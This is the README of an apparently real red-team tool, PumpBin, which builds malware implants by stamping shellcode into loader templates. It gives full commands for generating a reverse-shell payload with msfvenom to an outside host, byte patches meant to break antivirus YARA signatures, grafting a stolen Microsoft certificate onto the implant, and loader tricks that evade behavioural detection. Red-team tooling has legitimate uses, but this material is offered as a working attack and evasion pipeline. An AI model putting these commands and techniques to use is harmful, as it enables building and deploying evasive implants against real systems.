<div align="center">
  <a href="https://github.com/KriyosArcane/pumpbin/releases/latest">
    <img alt="GitHub Release" src="https://img.shields.io/github/v/release/KriyosArcane/pumpbin?sort=semver&filter=v*.*.*&display_name=tag&style=for-the-badge&labelColor=%2324273a&color=%238aadf4"></a>

  <a href="https://github.com/KriyosArcane/pumpbin/actions">
    <img alt="CI" src="https://img.shields.io/github/actions/workflow/status/KriyosArcane/pumpbin/rust.yml?branch=main&style=for-the-badge&labelColor=%2324273a&label=CI"></a>

  <a href="https://github.com/KriyosArcane/pumpbin/blob/main/LICENSE">
    <img alt="GitHub License" src="https://img.shields.io/github/license/KriyosArcane/pumpbin?style=for-the-badge&labelColor=%2324273a&color=%23eed49f"></a>
</div>

# 🎃 PumpBin

<p align="center">
  <img src="logo/pumpbin-256x256.png" height="30%" width="30%">
</p>

PumpBin is the build pipeline that turns a **loader template** plus
**shellcode** plus a **chain of post-build transforms** into a working
implant on disk. It is not a C2, not a shellcode generator. It sits one
step downstream of `msfvenom` / Donut / your custom stager, and one step
upstream of whatever delivery method drops the binary on a target.

The pitch in one line: stop hand-rolling per-engagement build programs.
Write the loader once, package it as a `.b1n`, and let operators stamp
shellcode into it in seconds.

```
$ pumpbin-cli generate \
    --plugin loader.b1n --shellcode payload.bin \
    --platform windows --type exe --output implant.exe
INFO Loading plugin "loader.b1n"
INFO Validating plugin for target platform=windows binary_type=exe
INFO Injecting shellcode
INFO Generation complete output="implant.exe"
```

## Why this exists

Modern red-team teams split into operators and capability researchers.
Researchers build the loaders; operators field them. There are two ways
that usually plays out:

1. **Operator hands shellcode to researcher**, who hand-builds the
   implant each time. Slow, doesn't scale, every build is one-off.
2. **Researcher writes a loader, plus a small build program that stamps
   shellcode into it**. Faster, scales — but every researcher reinvents
   the build program, its CLI, its on-disk output format, and the
   transforms (encrypt, sign, mutate) that wrap the loader.

PumpBin is the second approach generalized. The loader is yours; the
**`.b1n` plugin pack** is a stable container for it; the transforms are
**modules** — composable, registered by string id, written in whatever
language. Operators don't see the loader's internals — they see a CLI
and a list of modules.

## Where it fits next to other tools

| Tool | Role | PumpBin's relationship |
|---|---|---|
| **Cobalt Strike** | C2 + beacon | Generates beacon shellcode; PumpBin wraps it in your loader |
| **AdaptixC2** | C2 + extender plugins | Same — Adaptix produces shellcode, PumpBin produces the carrier binary |
| **Sliver / Mythic / Havoc** | C2 + implants | Stagers from these become PumpBin's input shellcode |
| **NetExec / impacket** | Post-ex / lateral | Orthogonal — they run after landing; PumpBin builds the thing you land |
| **EvadeX, Donut, msfvenom** | Shellcode generation/format | Upstream of PumpBin; their output is `--shellcode` |

PumpBin is the **carrier-binary build pipeline**. Everything else
integrates upstream (shellcode generators) or downstream (delivery, C2).

## The mental model

Three pieces matter:

**1. A loader.** A small native binary you write in Rust (or any
language that hits a placeholder convention). It contains two ASCII
markers — `$$SHELLCODE$$` and `$$99999$$` by default — plus zeroed
padding. At runtime it reads the size from the size-holder, allocates
RWX (or RW→RX, depending), copies the shellcode in, and calls it. The
[`new-loader` scaffold](#writing-a-loader) generates a buildable Cargo
crate with all of this pre-wired.

**2. A `.b1n` plugin pack.** A Cap'n Proto–serialized container that
bundles the loader template binary, where to find the markers, how big
the placeholder is, declared platforms, and a default chain of modules.
This is what gets shared between researcher and operator. One file.

**3. Modules.** Composable transforms that run during `generate`. Five
kinds:

| Kind | When it runs | What it transforms |
|---|---|---|
| `encrypt` | Before stamping | shellcode bytes → encrypted bytes (returns a key/nonce pair that pumpbin patches into the loader) |
| `format-encrypted` | After encrypt | reshapes the encrypted blob (e.g. base64) |
| `format-url` | Remote-mode builds | rewrites the URL the loader fetches from |
| `upload-remote` | Remote-mode builds | uploads shellcode somewhere, returns the URL |
| `post-build` | After the implant is fully assembled | mutates the final binary (signature graft, metadata, byte patches) |

Modules are either **built-in** (statically linked Rust) or
**external** (a folder in `~/.config/pumpbin/modules/<id>/` with a
manifest and an executable speaking the [wire protocol](MODULES.md)).
First-match-wins dispatch; built-ins shadow externals so a malicious
drop-in can't silently take over `aes-gcm`.

The full pipeline:

```
                  ┌────────────────┐
shellcode.bin ──→ │ encrypt module │ ──→ encrypted blob ──┐
                  └────────────────┘                       │
                                                           ↓
                  ┌────────────────────────┐         ┌──────────────┐
loader.b1n ────→  │ stamp into placeholder │ ──────→ │ implant bytes│
                  └────────────────────────┘         └──────────────┘
                                                           │
                  ┌─────────────────────┐                  ↓
                  │ post-build modules  │ ←─────────────────
                  │  (in declared order)│
                  └─────────────────────┘
                                                           ↓
                                                  implant.exe on disk
                                                  + optional .pbom.json SBOM
```

## Quick start

```bash
# 1. Scaffold a Windows loader. This writes a fresh Cargo crate with
#    build.rs + src/main.rs + pumpbin-pack.sh wired to the markers
#    PumpBin's stamper expects. No magic-string copy-paste.
pumpbin-cli new-loader myloader --platform windows --padding-bytes 8192

# 2. Build the loader and pack it.
cd myloader
cargo build --release
./pumpbin-pack.sh myloader.b1n      # wraps `pumpbin-cli create-b1n`

# 3. Generate a shellcode with whatever upstream tool.
msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.0.0.5 LPORT=8443 -f raw -o payload.bin

# 4. Stamp shellcode into the loader, with a post-build chain of
#    transforms. Here: graft a donor's Authenticode cert + apply a
#    YARA-evading byte swap to the embedded shellcode.
pumpbin-cli generate \
    --plugin myloader.b1n \
    --shellcode payload.bin \
    --platform windows --type exe \
    --output implant.exe \
    --post cert-graft  --post-arg cert-graft=donor=/path/to/MRT.exe \
    --post byte-patch  --post-arg byte-patch=patches=4831d2:4833d2,4831c0:4833c0

# 5. Pre-flight YARA scan before deploying anywhere. Catches static
#    hits locally so you don't burn a sandbox round-trip.
pumpbin-cli check implant.exe --yara-rules /path/to/elastic-rules/
```

If the same chain is the default for every build, bake it into the
`.b1n` at create time so the operator doesn't have to remember the
flags:

```bash
pumpbin-cli create-b1n \
    --template target/release/myloader.exe --output myloader.b1n \
    --name myloader --platform windows --type exe \
    --src-prefix '$$SHELLCODE$$' --size-holder '$$99999$$' \
    --post-module cert-graft  --post-module-config 0:donor=/tmp/MRT.exe \
    --post-module byte-patch  --post-module-config 1:patches=4831d2:4833d2
```

Now `generate` runs the chain automatically. Operator-supplied
`--post`/`--post-arg` *append* to it.

## What ships in the box

- **`pumpbin-cli`** — the CLI, clap 4. Subcommands:
  - `new-loader` — scaffold a buildable Rust loader crate.
  - `create-b1n` — pack a loader binary into a `.b1n`.
  - `generate` / `batch` / `build` — stamp shellcode into a loader.
    `build` reads everything from a `pumpbin.toml` profile;
    `generate` takes flags; `batch` processes a directory.
  - `inspect` — dump a `.b1n`'s metadata, embedded modules, config schema; diff two packs.
  - `verify` — Authenticode + checksum + marker-presence sanity check
    on a generated implant.
  - `convert` — reformat shellcode (hex / C array / Python bytes / base64).
  - `list-modules` — list built-in + drop-in modules and their declared args.
  - `module-test` — invoke a single module on a sample input; the dev
    loop for module authors. `--debug` dumps the wire protocol frames.
  - `check` — pre-flight YARA scan against a generated artifact.
  - `list-donors` — scan a directory and report which PEs carry an
    *embedded* Authenticode signature (suitable for `cert-graft` /
    `trustmebro`) vs catalog-signed-only.
  - `completions` — print a shell completion script.
- **`pumpbin`** — Iced 0.13 GUI (Generator + Maker). Click-driven path
  for operators who don't want the CLI.
- **`module-sdk`** — Rust crate with the wire-protocol framing helpers
  for external Rust modules. Optional: any language with stdin/stdout
  and JSON can implement the protocol in ~30 lines.

### Built-in modules

```
encrypt:
  aes-gcm           AES-256-GCM with random key/nonce per generation
  xor               Single-byte XOR with random non-zero key
format_url:
  url-passthrough   Embeds the operator URL verbatim
post_build:
  pe-version-info   Patch VS_VERSION_INFO StringFileInfo entries in a PE
                    (incl. `from_donor=<path>` to clone all eight fields
                    from another PE in one arg)
  byte-patch        In-place hex byte substitutions, equal-length pairs
                    (e.g. patches=4831d2:4833d2 to break the Metasploit
                    PEB-walk YARA pattern without changing semantics)
  cert-graft        Graft a donor PE's WIN_CERTIFICATE blob (defeats
                    "no signature" YARA/string checks; does not pass
                    WinVerifyTrust without a target-side SIP hijack)
```

For richer signature work (cert + `.rsrc` clone + SIP hijack), use the
external [`trustmebro`](https://github.com/KriyosArcane/TrustMeBro)
module rather than `cert-graft`.

## Module system

Full authoring guide: **[MODULES.md](MODULES.md)**.

Highlights:

- Drop a `<module-id>/pumpbin-module.toml` + executable into
  `~/.config/pumpbin/modules/`. No recompile, no registration. PumpBin
  discovers it on the next `list-modules`.
- Wire protocol v1: two length-prefixed frames in (JSON header + raw
  payload), two frames out. Modules speak it in any language. The
  Python example is ~40 lines including a `parse_args(header)` helper
  for the request's flat `["key=value", ...]` args array.
- Modules run as subprocesses with the operator's full OS privileges.
  No sandbox. Treat the drop-in dir like `~/.local/bin/`.
- A bad manifest logs a warning and skips that module; the rest keep
  working. Discovery never executes anything.

## Writing a loader

`pumpbin-cli new-loader` generates a complete Cargo crate:

```
myloader/
├── Cargo.toml             # windows-sys deps with the right features
├── build.rs               # writes the placeholder file at build time
├── pumpbin-pack.sh        # wraps `pumpbin-cli create-b1n` for you
└── src/
    └── main.rs            # the loader: reads the size, allocates,
                           # copies, calls — all on the main thread.
                           # NO CreateThread (an opinionated OPSEC default).
```

Useful flags:

- `--randomize-markers` — replaces `$$SHELLCODE$$` / `$$99999$$` with a
  unique per-scaffold pair, so the markers stop being a stable static
  signature across builds.
- `--binary-size-holder` — 4-byte u32 LE size slot instead of 9-byte
  decimal ASCII. Saves the `core::fmt` decimal-parse path; useful for
  PIC loaders that count every byte.
- `--pre-load-libs ws2_32,kernel32` *(Windows only)* — emits
  `LoadLibraryA` calls in `main()` *before* the shellcode runs, so the
  DLL-load event is attributed to the loader's signed `.text`, not the
  anonymous RWX shellcode region. Useful against behavioral rules like
  Elastic's "Network Module Loaded from Suspicious Unbacked Memory".
- `--no-rwx` *(Windows only)* — emits `VirtualAlloc(PAGE_READWRITE)` +
  `VirtualProtect(PAGE_EXECUTE_READ)` instead of single-step RWX. Trades
  the RWX-region heuristic for a `VirtualProtect` transition event.

The Darwin scaffold uses `mmap(PROT_EXEC)`; Linux is the same path.

## Operational features

- **Profile-driven builds** — `pumpbin.toml` is the single source of
  truth for a reproducible build (`pumpbin-cli build -f pumpbin.toml`).
- **Structured errors** — every failure carries a stable `PB-Exxxx`
  code (see [src/error.rs](src/error.rs)).
- **JSON logs** — `$XDG_DATA_HOME/PumpBin/logs/<timestamp>-<pid>.jsonl`
  on every run. Shellcode bytes never land in logs
  ([tests/log_redaction.rs](tests/log_redaction.rs) regression-guards it).
- **SBOMs** — set `output.sbom = true`, get a `<output>.pbom.json` with
  plugin sha256, modules sha256s, shellcode sha256, runtime config (with
  passwords redacted), builder identity, build duration.
- **OPSEC profile** — `~/.config/pumpbin/opsec.toml` enforces
  team-wide rules (e.g. `require_sbom = true`).
- **Memory hygiene** — shellcode buffers wiped on drop via
  `zeroize::ZeroizeOnDrop`.
- **Atomic writes** — every output file goes through `tempfile.persist()`;
  no half-written binaries on crash.
- **Cert grafting** — `cert-graft` lifts a donor signature onto the
  implant. Defeats string-match "unsigned" detection. Does **not** pass
  `WinVerifyTrust` (the donor's hash doesn't match the implant's). For
  that, pair with a target-side SIP hijack — see `trustmebro`.

## CI / cross-platform

| Job | Linux | macOS | Windows |
|---|---|---|---|
| `cargo fmt --check` | ✅ | — | — |
| `cargo clippy -D warnings` | ✅ | — | — |
| `cargo test --lib --tests` | ✅ | ✅ | ✅ |
| `cargo deny check` | ✅ | — | — |
| `cargo build --release --bin pumpbin` (GUI) | ✅ | — | — |
| `cargo build --release --bin pumpbin-cli` | ✅ | ✅ | ✅ |

The Iced 0.13 wgpu deps are flaky to install on macOS/Windows CI
runners, so the GUI binary is Linux-only in CI. The library that CLI +
GUI both delegate into **is** tested cross-platform.

Real-world verification: v2.0.0 was end-to-end exercised on macOS Ventura
13.7.8 (x86_64) under `dockur/macos` — build, scaffold, pack, stamp,
execute, reverse-shell callback all green; 40/40 lib tests pass natively
on Darwin.

## Building from source

```bash
git clone https://github.com/KriyosArcane/pumpbin.git
cd pumpbin

# CLI only (no GUI deps required):
cargo build --release --bin pumpbin-cli

# GUI (needs wayland + gtk3 + ssl on Linux):
sudo apt-get install libwayland-dev libxkbcommon-dev libgtk-3-dev libssl-dev
cargo build --release --bin pumpbin
```

The build regenerates `capnp/plugin_capnp.rs` from `capnp/plugin.capnp`
on every invocation — debug and release both — so a fresh checkout with
no `capnp/plugin_capnp.rs` works out of the box. (Pre-2.0 release builds
required the generated file to be checked in; that footgun is gone.)

## License

MIT — see [LICENSE](LICENSE).

## Status

v2.0 is the current line. The pre-2.0 Extism/WASM plugin model is
retired — modules are now statically-linked Rust built-ins plus a
language-agnostic drop-in protocol. `.b1n` packs built since v1.0.0
continue to load.

Active development happens on `feature/*` branches; see
[CHANGELOG.md](CHANGELOG.md) for release-by-release history.

PumpBin is maintained by KriyosArcane, based on the original
[b1n](https://github.com/B3nd1k/b1n) project.
